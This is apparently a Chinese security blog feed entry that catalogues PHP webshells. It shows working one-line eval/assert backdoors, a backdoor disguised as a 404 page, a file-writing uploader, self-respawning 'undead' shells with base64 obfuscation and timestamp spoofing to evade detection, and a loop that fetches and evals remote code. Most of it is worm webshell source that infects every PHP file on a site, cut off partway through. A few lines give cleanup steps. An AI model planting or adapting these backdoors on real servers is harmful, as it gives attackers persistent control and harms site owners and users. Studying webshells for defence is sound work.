href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 云原生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPmua</title>
      <link href="/p/36303170.html"/>
      <url>/p/36303170.html</url>
      
        <content type="html"><![CDATA[<p>整理汇总网络上常见的php_webshell进行学习分析。提升作为web狗的修养hhhhh</p><h1 id="mua😘分类"><a href="#mua😘分类" class="headerlink" title="mua😘分类"></a>mua😘分类</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>eval : PHP 4, PHP 5, PHP 7+ 均可用，接受一个参数，将字符串作为 PHP 代码执行</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> assert(<span class="variable">$_REQUEST</span>[<span class="string">&quot;pass&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>assert: PHP 4, PHP 5, PHP 7.2 以下均可用，一般接受一个参数，php 5.4.8 版本后可以接受两个参数</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span><br></pre></td></tr></table></figure><blockquote><p>最短一句话</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211123201030566.png" alt="image-20211123201030566"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211123201044588.png" alt="image-20211123201044588"></p><h3 id="404-php，利用404隐藏一句话"><a href="#404-php，利用404隐藏一句话" class="headerlink" title="404.php，利用404隐藏一句话"></a>404.php，利用404隐藏一句话</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;<span class="number">404</span> Not Found&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@preg_replace(<span class="string">&quot;/[pageerror]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>],<span class="string">&quot;saft&quot;</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;HTTP/1.1 404 Not Found&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>e模式, 只限用于preg_replace()函数,把替换的字符串中的内容当成一个PHP表达式。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@preg_replace(<span class="string">&quot;/[ZnF1cG5ncW4=]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>],<span class="string">&quot;YWdhah&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211123225628906.png"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211123225535738.png" alt="image-20211123225535738"></p><h2 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h2><p>主要完成文件上传功能</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;content-Type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span> </span><br><span class="line"><span class="keyword">echo</span></span><br><span class="line"><span class="string">&quot;&lt;/br&gt;获取服务器IP地址: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].</span><br><span class="line"><span class="string">&quot;&lt;/br&gt;获取服务信息: &quot;</span>.apache_get_version();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form method=<span class="string">&quot;POST&quot;</span>&gt;&lt;/br&gt;</span><br><span class="line">shell路径: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;file&quot;</span> size=<span class="string">&quot;60&quot;</span> value=<span class="string">&quot;&lt;? echo str_replace(&#x27;\\&#x27;,&#x27;/&#x27;,__FILE__) ?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;textarea name=<span class="string">&quot;text&quot;</span> COLS=<span class="string">&quot;70&quot;</span> ROWS=<span class="string">&quot;18&quot;</span> &gt;&lt;/textarea&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;保存&quot;</span> &gt; </span><br><span class="line">&lt;form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>)&#123;</span><br><span class="line"><span class="variable">$f</span>=fopen(<span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>],<span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span>   fwrite(<span class="variable">$f</span>,<span class="variable">$_POST</span>[<span class="string">&quot;text&quot;</span>])? <span class="string">&#x27;保存成功!&#x27;</span> : <span class="string">&#x27;保存失败!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1611541896073-c499e7c4-88da-4d22-8bf1-1df74d92b39e.png" alt="image.png"></p><blockquote><p>需要权限windows下成功率比较高</p></blockquote><h2 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h2><p>现在用的比较少了</p><p> <a href="https://github.com/DropAnn/sec-system/blob/main/1.%E6%89%A7%E8%A1%8C%E8%BF%9B%E6%94%BB/php/%E4%B9%A0%E7%A7%91%20v5.6.zip">习科v5.6.zip</a></p><p><a href="https://github.com/DropAnn/sec-system/blob/main/1.%E6%89%A7%E8%A1%8C%E8%BF%9B%E6%94%BB/php/shell.php">shell.php</a></p><h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;Validator.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    system(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .Validator.php&#x27;</span>);</span><br><span class="line">    usleep(<span class="number">5000</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>ignore_user_abort()</code> 可以实现当客户端关闭后仍然可以执行PHP代码，可保持PHP进程一直在执行，可实现所谓的计划任务功能与持续进程，只需要开启执行脚本，除非 apache等服务器重启或有脚本有输出，该PHP脚本将一直处于执行的状态，初看很实用，不过代价是一个PHP执行脚本的持续进程，开销很大，但却可以 实现很多意想不到的功能。<br><code>set_time_limit(0)</code>表示长时间链接运行，不限制页面运行时间<br><code>unlink(__FILE__)</code>;删除文件本身，起到隐蔽自身的作用<br>while 循环内每间隔<code>usleep(5000);</code>即写入新的后门文件<br><code>system()</code>执行的命令用于修改文件的创建时间，可以绕过<code>find –name &#39;*.php&#39; –mmin -10</code>命令检测最近10分钟修改或新创建的php文件，但不一定有用，可选。<br><code>1a1dc91c907325c69271ddf0c944bc72--&gt;pass</code></p></blockquote><p>网上流传的不死马, while 里面只是并没有判断了这个文件是不是存在 </p><p>那么我只需要把这个文件中的 shell 注释掉就可以绕过你的内存木马了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line"> set_time_limit(<span class="number">0</span>);</span><br><span class="line"> <span class="variable">$file</span> = <span class="string">&#x27;c.php&#x27;</span>;</span><br><span class="line"> <span class="variable">$code</span> = base64_decode(<span class="string">&#x27;PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+&#x27;</span>);</span><br><span class="line"> <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span>(md5(file_get_contents(<span class="variable">$file</span>)) != md5(<span class="variable">$code</span>)) &#123;</span><br><span class="line">         file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     usleep(<span class="number">50</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+`--&gt;`<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[c]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211129195604958.png" alt="image-20211129195604958"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211129195926939.png" alt="image-20211129195926939"></p><p>不死性</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211129200148731.png" alt="image-20211129200148731"></p><h3 id="查杀方法"><a href="#查杀方法" class="headerlink" title="查杀方法"></a>查杀方法</h3><ol><li><p>如果允许，重启服务是万能的；</p></li><li><p>其次，最好的解决方案是kill掉www-data用户的所有子进程（最有效，但是客户可能会让你赔钱）：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep www-data | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211129200401882.png" alt="image-20211129200401882"></p><ol start="3"><li>创建一个和不死马生成的马一样名字的目录；（收效甚微）</li></ol><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211129204357014.png" alt="image-20211129204357014" style="zoom:150%;" /><ol start="4"><li>写脚本一直删除木马文件。</li></ol><h2 id="无文件马"><a href="#无文件马" class="headerlink" title="无文件马"></a>无文件马</h2><p>自删除的木马，在运行一次后会将自身文件删除，但将某些代码运行至进程中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">unlink(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]);</span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$remote_file</span> = <span class="string">&#x27;http://127.0.0.1/eval.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$code</span> = file_get_contents(<span class="variable">$remote_file</span>))&#123;</span><br><span class="line">  @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">  sleep(<span class="number">5</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>eval.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;hello world &#x27;</span>.time());</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211201103244907.png" alt="image-20211201103244907"></p><p><code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code> 与 <code>__FILE__</code> 的区别</p><p><strong>相同点</strong></p><p>通常情况下，PHP <code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code> 与 <code>__FILE__</code> 都会返回 PHP 文件的完整路径（绝对路径）与文件名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;SCRIPT_FILENAME 为：&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;__FILE__ 为：&#x27;</span>,<span class="keyword">__FILE__</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>SCRIPT_FILENAME</code> 为：<code>/var/www/app/5.php</code><br><code>__FILE__</code> 为：<code>/var/www/app/5.php</code></p><p><strong>不同点</strong></p><p>尽管 <code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code> 与 <code>__FILE__</code> 非常相似，但在文件被 <code>include</code> 或 <code>require</code>包含的时候，二者的差别是：<code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code> 反映的是当前执行程序的绝对路径及文件名；<code>__FILE__</code> 反映的是原始文件（被包含文件）的绝对路径及文件名。</p><h2 id="蠕虫webshell"><a href="#蠕虫webshell" class="headerlink" title="蠕虫webshell"></a>蠕虫webshell</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ol><li>递归扫描所有web目录及文件，全部扫到的php写入webshell</li><li>网站全部php可作为webshell连接执行命令</li><li>不带参数请求又可以正常访问原页面，不影响访问</li><li>所有web路径目录写入单独一个特定webshell</li><li>判断是否写过不再重复写入</li><li>所有php页面都可以互相复活蠕虫webshell</li><li>蠕虫webshell返回所有php文件url地址</li><li>蠕虫webshell发送返回数据传输加密</li><li>数字签名校验执行、5秒后不可重放 后续添加</li><li>页面功能性可控（可以使全部php原有功能失效，只剩下webshell功能）</li><li>前端互相复活以及反渗透</li><li>适配meterpreter连接</li><li>加密混淆</li></ol><blockquote><p>带一个参数访问我的webshell，全站的php文件都被我感染，都可以当webshell连，都可以执行命令，只要带一个参数访问都可以互相复活。</p></blockquote><p>扫描从函数<code>scandir</code>替换为<code>is_dir()</code></p><h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h3><p>假设shell.php已经上传到目录，上传目录为upload，ip为192.168.1.1</p><ol><li><p>访问<code>http://192.168.1.1/upload/shell.php</code>正常不带参数访问是返回状态码500，页面会正常访问</p></li><li><p>带参数下划线访问，会自动感染全站php文件，所有php可以当shell连接</p><p>eg:<code>http://192.168.1.1/upload/shell.php?_</code></p></li><li><p>如上带下划线参数访问后，右键查看页面源代码可以看到所有被感染的php地址。</p></li><li><p>可以使用python把所有url爬下来，爬取规则：</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checks_arr = html.find_all(attrs=&#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;php_url&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="服务端代码"><a href="#服务端代码" class="headerlink" title="服务端代码"></a>服务端代码</h3><p><a href="https://zhuanlan.zhihu.com/p/86971281">来自于 3s_NWGeek 的代码</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$tips</span> = <span class="string">&#x27;AWD_Light_Check&#x27;</span>;</span><br><span class="line"><span class="comment">//这个是后面检查的是否感染头，如果没有，就会重写这个php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$Serv_Num</span> = <span class="number">159</span>;</span><br><span class="line"><span class="comment">//这个变量是要写入其他文件头部的本页行数，因为感染了其他php要互相感染，不能把其他原有php代码写入到其他php，会乱套。</span></span><br><span class="line"><span class="variable">$arr_dir</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">//全局变量，扫到的文件夹</span></span><br><span class="line"><span class="variable">$files</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">//全局变量，扫到的文件</span></span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;Url_Check&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Url_Check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$pageURL</span> = <span class="string">&#x27;http&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTPS&quot;</span>] == <span class="string">&quot;on&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$pageURL</span> .= <span class="string">&quot;s&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$pageURL</span> .= <span class="string">&#x27;://&#x27;</span>;</span><br><span class="line">        <span class="variable">$pageURL</span> .= <span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_NAME&quot;</span>] . <span class="string">&quot;:&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_PORT&quot;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$pageURL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">file_check</span>(<span class="params"><span class="variable">$dir</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//扫描文件夹</span></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$arr_dir</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$files</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$handle</span> = opendir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span> ((<span class="variable">$file</span> = readdir(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$file</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (is_dir(<span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>)) &#123;</span><br><span class="line">                            <span class="variable">$arr_dir</span>[] = <span class="variable">$dir</span>;</span><br><span class="line">                            <span class="variable">$files</span>[<span class="variable">$file</span>] = file_check(<span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>);</span><br><span class="line">                            <span class="comment">//拼接文件</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="variable">$arr_dir</span>[] = <span class="variable">$dir</span>;</span><br><span class="line">                            <span class="variable">$files</span>[] = <span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        closedir(<span class="variable">$handle</span>);</span><br><span class="line">        <span class="variable">$arr_dir</span> = array_unique(<span class="variable">$arr_dir</span>);</span><br><span class="line">        <span class="comment">//去重</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write_conf</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">#每个目录创一个马</span></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$Serv_Num</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$arr_dir</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr_dir</span> <span class="keyword">as</span> <span class="variable">$dir_path</span>) &#123;</span><br><span class="line">            <span class="comment">// echo &#x27;&lt;br&gt;&#x27;.$dir_path;</span></span><br><span class="line">            <span class="variable">$srcode</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$localtext</span> = file(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$Serv_Num</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">                <span class="variable">$srcode</span> .= <span class="variable">$localtext</span>[<span class="variable">$i</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//所有文件夹都生成一个webshell</span></span><br><span class="line">            <span class="comment">// echo &quot;&lt;span style=&#x27;color:#666&#x27;&gt;&lt;/span&gt; &quot; . $dir_path . &quot;/.Conf_check.php&quot; . &quot;&lt;br/&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$le</span> = Url_Check();</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;iframe id=&quot;check_url&quot;&gt;&#x27;</span> . <span class="variable">$le</span> . <span class="string">&#x27;&#x27;</span> . str_replace(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$dir_path</span> . <span class="string">&quot;/.Conf_check.php&quot;</span>) . <span class="string">&#x27;&lt;/iframe&gt;&#x27;</span>;</span><br><span class="line">            fputs(fopen(<span class="variable">$dir_path</span> . <span class="string">&quot;/.Conf_check.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="variable">$srcode</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当前目录所有php被感染</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vul_tran</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//每个文件夹递归生成一个默认的马以及感染当前目录所有php文件。所谓感染就是把自身固定的代码插入到其他php文件中，甚至可以加注释符号或者退出函数exit()；控制其他页面的可用性。不过要注意一下，是当前目录，这样响应速度会快很多，亲测如果是一次性感染全部目录的php文件后续会引发py客户端响应超时及其他bug，所以改过来了。</span></span><br><span class="line">        <span class="comment">//######</span></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$Serv_Num</span>;</span><br><span class="line">        <span class="variable">$pdir</span> = dirname(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="comment">//要获取的目录</span></span><br><span class="line">        <span class="comment">//先判断指定的路径是不是一个文件夹</span></span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$pdir</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$dh</span> = opendir(<span class="variable">$pdir</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span> ((<span class="variable">$fi</span> = readdir(<span class="variable">$dh</span>)) != <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="comment">//文件名的全路径 包含文件名</span></span><br><span class="line">                    <span class="variable">$file_Path</span> = <span class="variable">$pdir</span> . <span 